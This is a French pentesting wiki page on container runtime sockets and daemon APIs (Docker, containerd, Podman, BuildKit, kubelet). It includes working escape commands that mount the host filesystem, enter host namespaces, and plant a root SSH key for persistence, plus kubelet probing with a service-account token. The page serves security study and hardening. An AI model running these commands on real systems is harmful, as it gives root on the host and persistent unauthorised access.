# Exposition de l’API du runtime et du daemon

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

De nombreuses compromissions réelles de conteneurs ne commencent pas du tout par une évasion de namespace. Elles commencent par un accès au plan de contrôle du runtime. Si une charge de travail peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un listener TCP exposé, l’attaquant peut être en mesure de demander la création d’un nouveau conteneur avec davantage de privilèges, de monter le système de fichiers de l’hôte, de rejoindre les namespaces de l’hôte ou de récupérer des informations sensibles sur le nœud. Dans ces cas, l’API du runtime constitue la véritable frontière de sécurité, et sa compromission revient pratiquement à compromettre l’hôte.

C’est pourquoi l’exposition du socket du runtime doit être documentée séparément des protections du kernel. Un conteneur doté de seccomp, de capabilities et d’un confinement MAC ordinaires peut tout de même se trouver à un appel API de la compromission de l’hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l’intérieur. L’isolation kernel du conteneur actuel peut fonctionner exactement comme prévu, tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles d’accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local `unix:///var/run/docker.sock`. Historiquement, il a également été exposé à distance via des listeners TCP tels que `tcp://0.0.0.0:2375` ou un listener protégé par TLS sur `2376`. Exposer le daemon à distance sans TLS robuste ni authentification du client revient à transformer l’API Docker en interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais pas le principe. Si l’interface permet à l’appelant de créer des charges de travail, de monter des chemins de l’hôte, de récupérer des identifiants ou de modifier des conteneurs en cours d’exécution, elle constitue un canal de gestion privilégié et doit être traitée comme tel.

Une interface web de gestion des conteneurs peut exposer la même frontière sans donner au compte local un accès direct au socket. Par exemple, [l’issue #493 de Portainer](https://github.com/portainer/portainer/issues/493) documentait une réinitialisation non authentifiée du mot de passe administrateur dans une ancienne version 1.11.1. Considérez une interface accessible localement uniquement comme une piste à vérifier : confirmez la version installée et le comportement d’authentification, le contrôle réel de l’administrateur, et si son endpoint géré peut créer des conteneurs avec un bind mount de l’hôte inscriptible. [La documentation de Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) indique que la gestion via socket nécessite un accès au socket Docker ; un endpoint rootless ou restreint modifie l’impact sur l’hôte. Ne déduisez pas l’existence d’une faille d’authentification ou d’un accès root à l’hôte à partir du seul nom d’un processus, d’un port ou d’une chaîne de version.

Voici les chemins locaux courants à vérifier :

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Les stacks plus anciennes ou plus spécialisées peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ils sont moins courants dans les environnements modernes, mais doivent être traités avec la même prudence lorsqu’on les rencontre, car ils constituent des surfaces de contrôle du runtime et non de simples sockets d’application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et, de préférence, par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L’ancienne habitude d’ouvrir le daemon Docker en HTTP non chiffré par commodité est l’une des erreurs les plus dangereuses en administration de conteneurs, car la surface de l’API permet de créer directement des conteneurs privilégiés.

La configuration Docker utilisée historiquement ressemblait à ceci :

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Sur les hôtes basés sur systemd, la communication avec le daemon peut aussi apparaître sous la forme `fd://` : le processus hérite alors d’un socket déjà ouvert par systemd au lieu de le lier directement lui-même. L’essentiel n’est pas la syntaxe exacte, mais la conséquence sur la sécurité. Dès que le daemon écoute au-delà d’un socket local aux permissions strictes, la sécurité du transport et l’authentification des clients deviennent obligatoires, et non plus de simples mesures de renforcement facultatives.

## Abus

Si un socket de runtime est présent, vérifiez de quel socket il s’agit, s’il existe un client compatible et si un accès HTTP brut ou gRPC est possible :

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ces commandes sont utiles, car elles permettent de distinguer un chemin inexistant, un socket monté mais inaccessible et une API privilégiée active. Si le client fonctionne, la question suivante est de savoir si l’API peut lancer un nouveau conteneur avec un bind mount de l’hôte ou le partage de namespaces de l’hôte.

### Lorsqu’aucun client n’est installé

L’absence de `docker`, de `podman` ou d’un autre CLI convivial ne signifie pas que le socket est sûr. Docker Engine communique en HTTP via son socket Unix, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Ainsi, un environnement minimal disposant uniquement de `curl` peut suffire à piloter le daemon :

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Pour l’exécution de code PHP limitée par `open_basedir`, [les connexions aux sockets Unix restent une voie distincte](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) lorsque le processus PHP a l’autorisation système de s’y connecter.

C’est important en post-exploitation, car les défenseurs suppriment parfois les binaires client habituels, mais laissent le socket de gestion monté. Sur les hôtes Podman, rappelez-vous que le chemin à forte valeur diffère selon que le déploiement est rootful ou rootless : `unix:///run/podman/podman.sock` pour les instances de service rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour celles rootless.

### Exemple complet : du socket Docker à root sur l’hôte

Si `docker.sock` est accessible, l’évasion classique consiste à démarrer un nouveau conteneur qui monte le système de fichiers racine de l’hôte, puis à exécuter `chroot` dedans :

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Cela permet une exécution directe avec les privilèges root de l’hôte via le daemon Docker. L’impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau conteneur, l’attaquant peut modifier des fichiers de l’hôte, récupérer des identifiants, implanter une persistance ou démarrer d’autres workloads privilégiés.

### Exemple complet : du socket Docker aux namespaces de l’hôte

Si l’attaquant préfère entrer dans les namespaces plutôt que de se limiter à l’accès au système de fichiers :

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Cette voie atteint l’hôte en demandant au runtime de créer un nouveau conteneur avec une exposition explicite des namespaces de l’hôte, plutôt qu’en exploitant le conteneur actuel.

### Schéma de persistance via socket Docker

Le contrôle du runtime peut aussi servir à assurer la persistance, au lieu d’obtenir un shell ponctuel. Le schéma général consiste à créer un conteneur auxiliaire avec un montage de l’hôte, à écrire des éléments d’accès autorisés ou un hook de démarrage dans le système de fichiers de l’hôte monté, puis à vérifier que l’hôte les prend en compte.

Exemple de structure :

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

La même idée peut cibler des unités systemd, des fragments cron, des fichiers de démarrage d’applications ou des clés SSH, selon ce que l’opérateur veut démontrer. Le point important est que la modification persistante est effectuée grâce aux privilèges du daemon d’exécution sur le système de fichiers de l’hôte, et non grâce à des privilèges supplémentaires dans le conteneur d’origine.

### Raw Docker API Helper Pivot

Lorsque la CLI Docker est absente, le même flux de travail avec montage de l’hôte peut être exécuté via HTTP sur le socket Unix. Le flux générique consiste à confirmer l’API, créer un conteneur d’assistance avec un montage bind de l’hôte, le démarrer, créer une instance exec, puis démarrer cette instance exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

La requête finale `/exec/<id>/start` dépend de l’ID exec renvoyé, mais le point de sécurité ne dépend pas des détails exacts du JSON : un accès direct à l’API d’un daemon Docker rootful suffit pour demander une charge de travail auxiliaire plus puissante.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Si un client davantage de type Docker est présent, `nerdctl` peut être plus pratique que `ctr`, car il expose des options familières telles que `--privileged`, `--pid=host` et `-v` :

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

L’impact reste une compromission de l’hôte. Même si les outils spécifiques à Docker sont absents, une autre API de runtime peut offrir le même pouvoir administratif. Sur les nœuds Kubernetes, `crictl` peut également suffire pour la reconnaissance et l’interaction avec les conteneurs, car il communique directement avec le endpoint CRI.

### BuildKit Socket

`buildkitd` est facile à négliger, car on le considère souvent comme « juste le backend de build », mais le daemon reste un plan de contrôle privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d’exécuter des étapes de build arbitraires, d’inspecter les capacités des workers, d’utiliser des contextes locaux depuis l’environnement compromis et de demander des entitlements dangereux tels que `network.host` ou `security.insecure` lorsque le daemon est configuré pour les autoriser.

Les premières interactions utiles sont les suivantes :

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Si le daemon accepte des requêtes de build, vérifiez si des entitlements non sécurisés sont disponibles :

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité sans risque pour les développeurs. Considérez-le comme une autre surface administrative de grande valeur, en particulier sur les runners CI et les nœuds de build partagés.

### API du kubelet sur TCP

Le kubelet n’est pas un runtime de conteneurs, mais il fait toujours partie du plan de gestion du nœud et entre souvent dans la même discussion sur les limites de confiance. Si le port sécurisé `10250` du kubelet est accessible depuis le workload, ou si des identifiants de nœud, des kubeconfigs ou des droits de proxy sont exposés, l’attaquant peut être en mesure d’énumérer les Pods, de récupérer des logs ou d’exécuter des commandes dans des conteneurs locaux au nœud sans jamais passer par le chemin d’admission du serveur API Kubernetes.

Commencez par une découverte rapide :

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Si le chemin proxy du kubelet ou de l’API server autorise `exec`, un client compatible WebSocket peut ainsi exécuter du code dans d’autres conteneurs du nœud. C’est aussi pourquoi l’autorisation `nodes/proxy` avec seulement la permission `get` est plus dangereuse qu’il n’y paraît : la requête peut tout de même atteindre des endpoints du kubelet qui exécutent des commandes, et ces interactions directes avec le kubelet n’apparaissent pas dans les journaux d’audit Kubernetes normaux.<sup>[[2]](#references)</sup>

## Vérifications

L’objectif de ces vérifications est de déterminer si le conteneur peut atteindre un plan de gestion qui aurait dû rester hors de la frontière de confiance.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Ce qui est intéressant ici :

- Un socket runtime monté constitue généralement un accès administratif direct plutôt qu’une simple divulgation d’informations.
- Un listener TCP sur le port `2375` sans TLS doit être considéré comme une condition de compromission à distance.
- Les variables d’environnement telles que `DOCKER_HOST` révèlent souvent que la charge de travail a été conçue intentionnellement pour communiquer avec le runtime de l’hôte.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local par défaut | `dockerd` écoute sur le socket local et le daemon s’exécute généralement avec les privilèges root | Montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI sans daemon par défaut | Aucun daemon privilégié à longue durée de vie n’est nécessaire pour une utilisation locale ordinaire ; les sockets API peuvent toutefois être exposés lorsque `podman system service` est activé | Exposition de `podman.sock`, exécution du service sur toutes les interfaces, utilisation de l’API avec les privilèges root |
| containerd | Socket local privilégié | API administrative exposée via le socket local et généralement utilisée par des outils de niveau supérieur | Montage de `containerd.sock`, accès étendu à `ctr` ou `nerdctl`, exposition d’espaces de noms privilégiés |
| CRI-O | Socket local privilégié | Le point de terminaison CRI est destiné aux composants de confiance locaux au nœud | Montage de `crio.sock`, exposition du point de terminaison CRI à des charges de travail non fiables |
| Kubernetes kubelet | API de gestion locale au nœud | Le kubelet ne devrait pas être largement accessible depuis les Pods ; selon l’authn/authz, l’accès peut exposer l’état des Pods, des identifiants et des fonctionnalités d’exécution | Montage de sockets ou de certificats kubelet, auth kubelet faible, réseau de l’hôte avec point de terminaison kubelet accessible |



## References

- [1] [Exploitation du socket containerd, partie 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risques de contournement de l’API Server Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
